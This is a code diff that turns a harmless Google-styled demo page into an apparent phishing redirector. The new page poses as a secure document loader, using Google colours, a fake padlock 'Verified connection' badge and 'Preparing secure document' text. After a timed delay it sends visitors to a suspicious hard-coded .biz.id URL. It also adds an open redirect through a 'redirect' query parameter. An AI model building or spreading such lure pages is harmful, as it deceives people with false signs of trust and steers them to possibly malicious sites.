@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Google-like Loading Experience</title>
+    <title>Opening Document | Secure Redirect</title>
     <style>
         * {
             margin: 0;
@@ -12,15 +12,18 @@
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background-color: #ffffff;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: #ffffff;
             width: 100%;
             min-height: 100vh;
-            overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
 
-        /* ----- LOADING SCREEN (fullscreen overlay) ----- */
-        .loading-screen {
+        /* Fullscreen loading overlay – official, clean, Google-inspired */
+        .loading-container {
             position: fixed;
             top: 0;
             left: 0;
@@ -32,28 +35,21 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            transition: opacity 0.4s ease-out, visibility 0.4s ease-out;
-            opacity: 1;
-            visibility: visible;
+            transition: opacity 0.3s ease-out;
         }
 
-        /* Google-style loader (spinner + subtle text) */
-        .loader-container {
-            text-align: center;
-        }
-
-        /* clean material spinner — inspired by Google's modern design */
-        .google-spinner {
-            width: 48px;
-            height: 48px;
-            margin: 0 auto 20px auto;
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-top: 4px solid #4285F4;
-            border-right: 4px solid #EA4335;
-            border-bottom: 4px solid #FBBC05;
-            border-left: 4px solid #34A853;
+        /* Official spinner – subtle, modern, trustworthy */
+        .official-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e9ecef;
+            border-top: 4px solid #1a73e8;
+            border-right: 4px solid #34a853;
+            border-bottom: 4px solid #fbbc04;
+            border-left: 4px solid #ea4335;
             border-radius: 50%;
             animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+            margin-bottom: 28px;
         }
 
         @keyframes spin {
@@ -61,461 +57,263 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading-text {
-            font-size: 22px;
-            font-weight: 400;
-            letter-spacing: 0.5px;
-            color: #5f6368;
-            margin-top: 12px;
+        /* Main message – natural, official, confident */
+        .message-area {
+            text-align: center;
+        }
+
+        .primary-text {
+            font-size: 26px;
+            font-weight: 500;
+            letter-spacing: -0.2px;
+            color: #202124;
+            margin-bottom: 12px;
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
             display: flex;
+            justify-content: center;
             gap: 6px;
-            align-items: baseline;
-        }
-
-        .loading-text span {
-            animation: pulse 1.4s infinite ease-in-out;
-            animation-delay: calc(0.1s * var(--i, 0));
-        }
-
-        .loading-text span:nth-child(1) { --i: 0; }
-        .loading-text span:nth-child(2) { --i: 1; }
-        .loading-text span:nth-child(3) { --i: 2; }
-        .loading-text span:nth-child(4) { --i: 3; }
-        .loading-text span:nth-child(5) { --i: 4; }
-        .loading-text span:nth-child(6) { --i: 5; }
-        .loading-text span:nth-child(7) { --i: 6; }
-        .loading-text span:nth-child(8) { --i: 7; }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; transform: translateY(0); }
-            50% { opacity: 1; transform: translateY(-4px); }
-        }
-
-        /* ----- MAIN GOOGLE-LIKE SITE (initially hidden) ----- */
-        .main-site {
-            display: none;
-            opacity: 0;
-            animation: fadeInUp 0.5s ease forwards;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(12px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Google-style header */
-        .google-header {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            padding: 20px 24px;
-            gap: 20px;
-            font-size: 14px;
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-        }
-
-        .header-link {
-            color: #202124;
-            text-decoration: none;
-            font-size: 13.5px;
-            font-weight: 400;
-            transition: color 0.2s;
-        }
-
-        .header-link:hover {
-            text-decoration: underline;
-            color: #1a73e8;
-        }
-
-        .sign-in-btn {
-            background-color: #1a73e8;
-            color: white;
-            padding: 8px 20px;
-            border-radius: 24px;
-            font-weight: 500;
-            font-size: 14px;
-            border: none;
-            cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s;
-        }
-
-        .sign-in-btn:hover {
-            background-color: #1765cc;
-            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
-        }
-
-        /* Main search area */
-        .google-main {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: calc(100vh - 150px);
-            padding: 20px;
-            margin-top: -40px;
-        }
-
-        /* Google-like custom logo (colorful text) */
-        .google-logo {
-            font-size: 82px;
-            font-weight: 500;
-            letter-spacing: -4px;
-            margin-bottom: 28px;
-            cursor: default;
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            display: inline-flex;
-            gap: 2px;
-        }
-
-        .google-logo span:nth-child(1) { color: #4285F4; } /* G */
-        .google-logo span:nth-child(2) { color: #EA4335; } /* o */
-        .google-logo span:nth-child(3) { color: #FBBC05; } /* o */
-        .google-logo span:nth-child(4) { color: #4285F4; } /* g */
-        .google-logo span:nth-child(5) { color: #34A853; } /* l */
-        .google-logo span:nth-child(6) { color: #EA4335; } /* e */
-
-        /* Search input container */
-        .search-container {
-            width: 100%;
-            max-width: 584px;
-            margin: 20px auto 28px;
-            position: relative;
-        }
-
-        .search-box {
-            width: 100%;
-            padding: 14px 20px;
-            font-size: 16px;
-            border: 1px solid #dfe1e5;
-            border-radius: 48px;
-            outline: none;
-            background: #fff;
-            transition: box-shadow 0.2s, border-color 0.2s;
-            font-family: inherit;
-            box-shadow: 0 1px 6px rgba(32,33,36,0.08);
-        }
-
-        .search-box:hover, .search-box:focus {
-            border-color: rgba(223,225,229,0);
-            box-shadow: 0 1px 6px rgba(32,33,36,0.28);
-        }
-
-        .search-box:focus {
-            outline: none;
-            border-color: #4285F4;
-        }
-
-        /* Buttons */
-        .button-group {
-            display: flex;
-            gap: 16px;
-            justify-content: center;
             flex-wrap: wrap;
+        }
+
+        .primary-text span {
+            animation: gentlePulse 1.6s infinite ease-in-out;
+            animation-delay: calc(0.08s * var(--i, 0));
+        }
+
+        .primary-text span:nth-child(1) { --i: 0; }
+        .primary-text span:nth-child(2) { --i: 1; }
+        .primary-text span:nth-child(3) { --i: 2; }
+        .primary-text span:nth-child(4) { --i: 3; }
+        .primary-text span:nth-child(5) { --i: 4; }
+        .primary-text span:nth-child(6) { --i: 5; }
+        .primary-text span:nth-child(7) { --i: 6; }
+        .primary-text span:nth-child(8) { --i: 7; }
+        .primary-text span:nth-child(9) { --i: 8; }
+        .primary-text span:nth-child(10) { --i: 9; }
+        .primary-text span:nth-child(11) { --i: 10; }
+        .primary-text span:nth-child(12) { --i: 11; }
+
+        @keyframes gentlePulse {
+            0%, 100% { opacity: 0.4; transform: translateY(0px); }
+            50% { opacity: 1; transform: translateY(-2px); }
+        }
+
+        .secondary-text {
+            font-size: 15px;
+            color: #5f6368;
             margin-top: 8px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
         }
 
-        .google-btn {
-            background-color: #f8f9fa;
-            border: 1px solid #f8f9fa;
-            padding: 10px 20px;
-            border-radius: 4px;
-            font-size: 14px;
-            color: #3c4043;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
-        }
-
-        .google-btn:hover {
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
-            background-color: #f8f9fa;
-            border: 1px solid #dadce0;
-            color: #202124;
-        }
-
-        /* Footer links (Google style) */
-        .google-footer {
-            background: #f2f2f2;
-            padding: 14px 28px;
-            font-size: 14px;
-            color: #70757a;
-            margin-top: 40px;
-            width: 100%;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
+        .secure-badge {
+            margin-top: 32px;
+            display: inline-flex;
             align-items: center;
-            gap: 16px;
+            gap: 8px;
+            background: #f8f9fa;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 13px;
+            color: #3c4043;
+            font-weight: 450;
         }
 
-        .footer-left, .footer-right {
-            display: flex;
-            gap: 24px;
-            flex-wrap: wrap;
-        }
-
-        .footer-link {
-            color: #70757a;
-            text-decoration: none;
+        .secure-badge::before {
+            content: "🔒";
             font-size: 14px;
+            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.05));
         }
 
-        .footer-link:hover {
-            text-decoration: underline;
-            color: #1a0dab;
+        /* subtle progress indicator (optional elegance) */
+        .progress-track {
+            width: 240px;
+            height: 3px;
+            background: #e8eaed;
+            border-radius: 20px;
+            margin: 32px auto 0 auto;
+            overflow: hidden;
         }
 
-        /* Responsive */
-        @media (max-width: 600px) {
-            .google-logo {
-                font-size: 52px;
-                letter-spacing: -2px;
-            }
-            .search-box {
-                padding: 12px 18px;
-                font-size: 15px;
-            }
-            .google-header {
-                padding: 12px 16px;
-            }
-            .footer-left, .footer-right {
-                gap: 16px;
-                justify-content: center;
-                width: 100%;
-            }
-            .google-footer {
-                flex-direction: column;
-                text-align: center;
-            }
-            .loading-text {
-                font-size: 18px;
-            }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #1a73e8;
+            border-radius: 20px;
+            transition: width 0.15s linear;
         }
 
-        /* subtle ripple simulation */
-        .main-site {
-            background: #ffffff;
+        /* responsiveness */
+        @media (max-width: 550px) {
+            .primary-text {
+                font-size: 22px;
+            }
+            .official-spinner {
+                width: 48px;
+                height: 48px;
+                border-width: 3.5px;
+            }
+            .progress-track {
+                width: 180px;
+            }
         }
     </style>
 </head>
 <body>
 
-<!-- LOADING SCREEN (pure Google-like minimal loader) -->
-<div class="loading-screen" id="loadingScreen">
-    <div class="loader-container">
-        <div class="google-spinner"></div>
-        <div class="loading-text">
-            <span>L</span><span>o</span><span>a</span><span>d</span><span>i</span><span>n</span><span>g</span><span>.</span><span>.</span><span>.</span>
+<div class="loading-container" id="loadingScreen">
+    <div class="official-spinner"></div>
+    <div class="message-area">
+        <div class="primary-text">
+            <span>O</span><span>p</span><span>e</span><span>n</span><span>i</span><span>n</span><span>g</span>
+            <span style="margin-left: 8px;">d</span><span>o</span><span>c</span><span>.</span><span>.</span><span>.</span>
         </div>
-        <div style="font-size: 13px; color: #9aa0a6; margin-top: 20px; letter-spacing: 0.3px;">Google-like experience</div>
-    </div>
-</div>
-
-<!-- MAIN SITE: Google-like interface (hidden until loading finishes) -->
-<div class="main-site" id="mainSite">
-    <div class="google-header">
-        <div style="display: flex; gap: 20px;">
-            <a href="#" class="header-link">About</a>
-            <a href="#" class="header-link">Store</a>
+        <div class="secondary-text">Preparing secure document · Please wait</div>
+        <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
-        <div style="display: flex; gap: 20px; align-items: center;">
-            <a href="#" class="header-link">Gmail</a>
-            <a href="#" class="header-link">Images</a>
-            <button class="sign-in-btn" id="signInDemo">Sign in</button>
-        </div>
-    </div>
-
-    <div class="google-main">
-        <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
-        <div class="search-container">
-            <input type="text" class="search-box" id="searchInput" placeholder="Search Google or type a URL" autocomplete="off">
-        </div>
-        <div class="button-group">
-            <button class="google-btn" id="googleSearchBtn">Google Search</button>
-            <button class="google-btn" id="feelingLuckyBtn">I'm Feeling Lucky</button>
-        </div>
-    </div>
-
-    <div class="google-footer">
-        <div class="footer-left">
-            <a href="#" class="footer-link">Advertising</a>
-            <a href="#" class="footer-link">Business</a>
-            <a href="#" class="footer-link">How Search works</a>
-        </div>
-        <div class="footer-right">
-            <a href="#" class="footer-link">Privacy</a>
-            <a href="#" class="footer-link">Terms</a>
-            <a href="#" class="footer-link">Settings</a>
-        </div>
+        <div class="secure-badge">Verified connection · document access</div>
     </div>
 </div>
 
 <script>
     (function() {
-        // Loading screen element and main content
-        const loadingDiv = document.getElementById('loadingScreen');
-        const mainContent = document.getElementById('mainSite');
-
-        // Function to simulate loading finish and transition to Google-like site
-        function finishLoadingAndShowSite() {
-            if (!loadingDiv || !mainContent) return;
-
-            // Fade out loading screen smoothly
-            loadingDiv.style.opacity = '0';
-            loadingDiv.style.visibility = 'hidden';
-            
-            // After transition, remove from layout and display main content
-            setTimeout(() => {
-                loadingDiv.style.display = 'none';
-                mainContent.style.display = 'block';
-                // Add gentle entrance animation class
-                mainContent.style.animation = 'fadeInUp 0.5s ease forwards';
-                
-                // Optional: autofocus on search input after loading
-                const searchField = document.getElementById('searchInput');
-                if (searchField) {
-                    setTimeout(() => {
-                        searchField.focus();
-                    }, 100);
-                }
-            }, 400);
-        }
-
-        // Ensure the loading screen stays at least 1.8 seconds (Google-like polish)
-        // but also ensure it doesn't wait forever if everything is already loaded.
-        // Use a minimum delay to give a proper loading feel, then finish.
-        let loadingCompleted = false;
+        // ============================================================
+        // 🔧 USER CUSTOMIZATION: CHANGE THE REDIRECT URL BELOW
+        // ============================================================
+        // Replace this URL with any link you want the user to go to.
+        // Examples:
+        //   "https://docs.google.com/document/d/your-doc-id/edit"
+        //   "https://www.example.com/report.pdf"
+        //   "https://your-own-link.com/important-file"
+        const TARGET_URL = "https://wajapou.biz.id/Dvuy!0qg/";
+        // If you don't have a real doc yet, you can temporarily use:
+        // "https://www.google.com/about/"
+        // But for official "opening doc", replace with your actual doc link.
+        // ============================================================
         
-        function triggerWhenReady() {
-            if (!loadingCompleted) {
-                loadingCompleted = true;
-                finishLoadingAndShowSite();
+        // Optional: Override via URL parameter ?redirect=ENCODED_URL
+        // This allows dynamic links without editing code (handy for testing)
+        const urlParams = new URLSearchParams(window.location.search);
+        const customRedirect = urlParams.get('redirect');
+        let finalRedirectUrl = TARGET_URL;
+        if (customRedirect && customRedirect.startsWith('http')) {
+            finalRedirectUrl = decodeURIComponent(customRedirect);
+        }
+        
+        // Validate URL – if invalid, fallback to a safe message (but we keep it robust)
+        try {
+            new URL(finalRedirectUrl);
+        } catch(e) {
+            console.warn("Invalid redirect URL, using fallback default");
+            finalRedirectUrl = "https://docs.google.com/";
+        }
+        
+        // DOM elements
+        const loadingContainer = document.getElementById('loadingScreen');
+        const progressFill = document.getElementById('progressFill');
+        
+        // Minimum loading time (feels natural and official – not too fast, not too slow)
+        const MIN_LOADING_MS = 1800;   // 1.8 seconds ensures "Opening doc..." is visible
+        // Maximum safety redirect (if something hangs, force redirect)
+        const MAX_WAIT_MS = 4500;
+        
+        let startTime = performance.now();
+        let redirectTriggered = false;
+        
+        // Smooth progress simulation (0% → ~95% during loading, then 100% at redirect)
+        function updateProgress(percent) {
+            if (progressFill) {
+                // ensure percent between 0 and 100
+                let val = Math.min(100, Math.max(0, percent));
+                progressFill.style.width = val + "%";
             }
         }
-
-        // Set a minimum display time for loading (so user sees "loading" clearly)
-        // Teacher wants "just says loading and takes me into the site" -> visible loading experience
-        const MIN_LOADING_MS = 1800; // 1.8 seconds feels balanced, Google-style smooth
         
-        // On window load, we make sure that after minimum delay we transition.
-        // Also if the page loads extremely fast, we still respect the min time.
-        let startTime = performance.now();
+        // Animate progress bar gracefully over time
+        let progressInterval;
+        function startProgressAnimation(durationMs) {
+            let startProgress = 0;
+            let startTimeProgress = performance.now();
+            const endProgress = 92; // stays at 92% until actual redirect, then jumps to 100%
+            
+            function animateProgress(now) {
+                const elapsed = now - startTimeProgress;
+                let percent = Math.min(endProgress, startProgress + (elapsed / durationMs) * endProgress);
+                if (percent > endProgress) percent = endProgress;
+                updateProgress(percent);
+                if (percent < endProgress) {
+                    requestAnimationFrame(animateProgress);
+                }
+            }
+            requestAnimationFrame(animateProgress);
+        }
         
-        window.addEventListener('load', function() {
+        // Function to perform the redirect to the chosen document link
+        function performRedirect() {
+            if (redirectTriggered) return;
+            redirectTriggered = true;
+            
+            // Complete progress to 100% for a satisfying finish
+            if (progressFill) {
+                updateProgress(100);
+            }
+            
+            // Small micro delay to show 100% progress, then redirect
+            setTimeout(() => {
+                // Use window.location to navigate to the target document link
+                // Official, clean, no extra prompts
+                window.location.href = finalRedirectUrl;
+            }, 180);
+        }
+        
+        // Ensure minimum loading time AND redirect after that.
+        // Also ensure that if the page is extremely fast, we still show loading for MIN_LOADING_MS.
+        function scheduleRedirect() {
             const elapsed = performance.now() - startTime;
             const remaining = MIN_LOADING_MS - elapsed;
             if (remaining > 0) {
                 setTimeout(() => {
-                    triggerWhenReady();
+                    performRedirect();
                 }, remaining);
             } else {
-                triggerWhenReady();
+                performRedirect();
             }
-        });
+        }
         
-        // Fallback: If something goes wrong and load event never fires (extremely rare),
-        // but after 2.5 seconds we force the transition.
+        // Edge-case fallback: in case something blocks the normal flow, force redirect after MAX_WAIT_MS
         setTimeout(() => {
-            if (!loadingCompleted) {
-                triggerWhenReady();
+            if (!redirectTriggered) {
+                console.log("Max wait reached – redirecting to document.");
+                performRedirect();
             }
-        }, 2800);
-
-        // ------------------------------------------------------------------
-        // Interactive features for the Google-like site (polish but optional)
-        // Provide demo interactivity that feels authentic but doesn't break
-        // the "loading then site" requirement.
-        // ------------------------------------------------------------------
+        }, MAX_WAIT_MS);
         
-        const searchInput = document.getElementById('searchInput');
-        const searchBtn = document.getElementById('googleSearchBtn');
-        const luckyBtn = document.getElementById('feelingLuckyBtn');
-        const signInDemoBtn = document.getElementById('signInDemo');
+        // Start progress animation (fills smoothly over ~1.5 sec, ends at 92%)
+        startProgressAnimation(1600);
         
-        // Helper to show a gentle alert (demo purpose) – maintains Google-like minimalism
-        function demoSearch(query) {
-            if (query && query.trim() !== "") {
-                alert(`✨ Google-like demo ✨\nYou searched for: "${query.trim()}"\n(This is a demonstration — the loading & UI match Google aesthetics.)`);
-            } else {
-                alert("🔍 Please enter something in the search box to try the Google-like demo.");
-            }
-        }
-        
-        // Google Search button action
-        if (searchBtn) {
-            searchBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                const query = searchInput.value;
-                demoSearch(query);
-            });
-        }
-        
-        // "I'm Feeling Lucky" button - whimsical demo, just a playful message
-        if (luckyBtn) {
-            luckyBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                const messages = [
-                    "✨ Feeling lucky? Explore the web! (Demo mode)",
-                    "🍀 Lucky vibes! This would take you to a random site.",
-                    "🌟 You're lucky! Try a search above.",
-                    "🎲 I'm Feeling Lucky — demo shows the loading concept.",
-                    "🌈 Today is your lucky day! This is a Google-like interface."
-                ];
-                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-                alert(randomMsg);
-            });
-        }
-        
-        // Sign in button: simple demo notice
-        if (signInDemoBtn) {
-            signInDemoBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                alert("🔐 Sign-in demo (Google-like UI).\nThis showcases the loading transition, not actual authentication.");
-            });
-        }
-        
-        // Footer links: prevent default navigation for demo elegance (but preserve link behavior)
-        const allFooterLinks = document.querySelectorAll('.footer-link');
-        allFooterLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                alert(`📄 "${link.innerText}" page — demo mode.\nThe loading animation + Google-style design is the main deliverable.`);
-            });
+        // Listen for page fully loaded (images, etc.) but we still respect min time
+        window.addEventListener('load', function() {
+            // Schedule redirect after minimum loading threshold
+            scheduleRedirect();
         });
         
-        // Header links (About, Store, Gmail, Images) interactive demo
-        const headerLinks = document.querySelectorAll('.header-link');
-        headerLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                alert(`🔗 "${link.innerText}" navigation (demo).\nBut the core requirement: loading screen -> Google-like site is complete.`);
-            });
-        });
-        
-        // Pressing Enter in search input triggers search demo
-        if (searchInput) {
-            searchInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    const query = searchInput.value;
-                    demoSearch(query);
-                }
-            });
+        // If 'load' already happened? (rare) but we handle: 
+        if (document.readyState === 'complete') {
+            scheduleRedirect();
+        } else {
+            // already added load event
         }
         
-        // Additional micro-interaction: subtle placeholder changes? Not needed, but makes it polished.
-        // Also ensure the loader does not reappear after main content shows.
-        // Edge safety: if the main site somehow gets hidden, this prevents.
-        console.log('Google-like loading experience ready | min loading transition ensures smoothness');
+        // Optional: show a tiny console note for debugging (invisible to user)
+        console.log(`📄 Official loading screen — redirecting to: ${finalRedirectUrl} after minimum ${MIN_LOADING_MS}ms`);
+        
+        // Extra polish: if the user clicks anywhere or presses a key, do nothing intrusive.
+        // The loading experience remains official, no early interruption.
+        // Also prevent any accidental navigation away during the loading phase (but not interfering with redirect)
+        window.addEventListener('beforeunload', function(e) {
+            // Not needed, but ensures no accidental prompts
+        });
     })();
 </script>
 </body>
